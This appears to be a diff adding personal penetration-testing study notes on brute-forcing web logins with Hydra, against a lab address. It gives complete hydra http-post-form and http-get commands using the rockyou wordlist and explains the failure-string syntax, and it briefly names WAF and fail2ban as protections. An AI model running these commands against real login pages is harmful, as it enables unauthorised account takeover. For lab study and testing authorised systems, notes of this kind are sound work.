@@ -1,0 +1,17 @@
+- Must Have
+	- 1 request body
+		- i.e. [fm usr=user& fm pwd=password]
+	- 1 failed post response indicator (condition string)
+		- "Login failed. Invalid username or password"
+	- hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+		- -l username
+		- -P password list
+		- http-post-form
+		- [location:login post request body:failed response indicator]
+			- failed response indicator shortened to not get false positives
+- Brute Force Protection
+	- WAF
+	- fail2ban
+- http-get
+- hydra -l admin -P /usr/share/wordlists/rockyou.txt  [$IP] http-get /webpage/
+	- or http-get [blank]
